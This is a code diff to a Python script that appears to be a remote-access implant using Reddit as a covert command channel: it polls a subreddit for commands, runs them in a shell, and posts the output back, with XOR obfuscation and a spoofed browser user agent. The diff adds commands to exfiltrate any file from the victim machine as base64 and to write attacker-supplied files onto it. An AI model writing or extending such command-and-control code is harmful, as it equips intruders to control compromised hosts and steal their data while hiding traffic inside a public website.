@@ -6,6 +6,20 @@ import json
 import subprocess
 import base64
 
+#Function to convert base64 to file
+def base64_to_file(base64_string, filename):
+    # decode the base64 string
+    decoded_data = base64.b64decode(base64_string).decode('utf-8')
+    # write the data to the file
+    with open(filename, 'wb') as f:
+        f.write(decoded_data.encode())
+
+#Function to encode a file to base64
+def encode_file_in_base64(filepath):
+    with open(filepath, 'rb') as file:
+        file_data = file.read()
+    return base64.b64encode(file_data).decode('utf-8')
+
 #Function to xor encrypt a string
 def xor_encrypt(plaintext, key):
     encrypted_text = ""
@@ -105,7 +119,7 @@ if __name__ == "__main__":
     username = "myusername"
     password = "mypassword"
     subreddit = "mysubreddit"
-    listenerID = "listener_number";
+    listenerID = "listener_number"
     xor_key = "myxorkey"
     #-------------------------------------
     user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
@@ -118,9 +132,23 @@ if __name__ == "__main__":
                      user_agent = user_agent)
                      
     reddit.validate_on_submit = True
-    
+
     while True:
         time.sleep(5)
         command = readTask(username, password, subreddit, listenerID)
-        output = runTask(command)
-        sendOutput(command, output, username, password, subreddit, listenerID)
+        
+        if(command[:8] == "download"):
+            filename = command[9:] #save filename
+            output = encode_file_in_base64(filename)
+            if(len(output) > 10000):
+                sendOutput(command, "[!] File is too large (" + str(len(output)) + "/10000 available characters)", username, password, subreddit, listenerID)
+            else:
+                sendOutput(command, output, username, password, subreddit, listenerID)
+        
+        elif(command[:6] == "upload"):
+            base64_to_file(command.split()[2], command.split()[1])
+            sendOutput(command, "[+] File uploaded successfully", username, password, subreddit, listenerID)
+        
+        else:
+            output = runTask(command)
+            sendOutput(command, output, username, password, subreddit, listenerID)
